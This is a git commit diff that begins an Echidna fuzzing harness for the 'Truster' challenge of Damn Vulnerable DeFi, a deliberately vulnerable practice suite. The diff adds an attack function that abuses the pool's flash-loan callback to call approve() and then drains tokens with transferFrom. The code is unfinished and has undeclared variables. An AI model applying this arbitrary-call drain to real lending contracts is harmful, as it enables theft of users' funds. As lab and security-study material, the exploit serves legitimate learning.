24e0780f919ad2f6e0bc1661bf0bac7c89332f73
Brandon Wong <branjwong@hey.com>
2024-04-16 00:45:38 +0000

    start invariant

--- dvd3/src/Invariants.sol
+++ dvd3/src/Invariants.sol
@@ -1,6 +1,8 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/utils/Address.sol";
+import "./TrusterLenderPool.sol";
+import "./DamnValuableToken.sol";
 
 /// @dev Run the template with
 ///      ```
@@ -11,7 +13,34 @@ import "@openzeppelin/contracts/utils/Address.sol";
 contract InvariantTests {
     using Address for address payable;
 
-    constructor() payable {}
+    uint256 constant FLASH_LOAN_POOL_AMOUNT = 100_000_000;
+
+    TrusterLenderPool lenderPool;
+    DamnValuableToken valuableToken;
+
+    constructor() {
+        (valuableToken, lenderPool) = Deployer.deploy();
+
+        // deploy token
+        // deploy pool
+        // deal balance to pool
+    }
+
+    // write attack function
+    function attack(uint256 amount) external {
+        lenderPool.flashLoan(
+            0,
+            address(this),
+            address(valuableToken),
+            abi.encodeWithSignature(
+                "approve(address,uint256)", //@audit-info no spaces between args
+                address(owner),
+                amount
+            )
+        );
+
+        valuableToken.transferFrom(address(lenderPool), address(owner), amount);
+    }
 
     function echidna_test_receiver_balance_cannot_decrease()
         public
@@ -19,5 +48,14 @@ contract InvariantTests {
         returns (bool)
     {
         return true;
+    }
+}
+
+contract Deployer {
+    function deploy() external returns (DamnValuableToken, TrusterLenderPool) {
+        valuableToken = new DamnValuableToken();
+        lenderPool = new TrusterLenderPool(address(valuableToken));
+
+        return (valuableToken, lenderPool);
     }
 }
